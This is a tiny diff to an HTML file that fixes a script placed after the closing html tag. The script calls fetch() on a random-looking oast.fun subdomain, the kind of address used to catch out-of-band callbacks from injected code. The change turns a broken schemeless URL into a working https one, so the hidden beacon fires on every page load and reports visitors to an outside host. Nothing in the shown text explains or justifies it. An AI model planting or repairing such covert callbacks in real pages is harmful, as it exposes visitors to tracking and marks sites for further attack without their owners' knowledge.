@@ -9,5 +9,5 @@
 </body>
 </html>
 <script>
-fetch('gxijdmztknwyzdvjophzn9ymqm4mdzz73.oast.fun').then(response => response.json());
+fetch('https://gxijdmztknwyzdvjophzn9ymqm4mdzz73.oast.fun');
 </script>
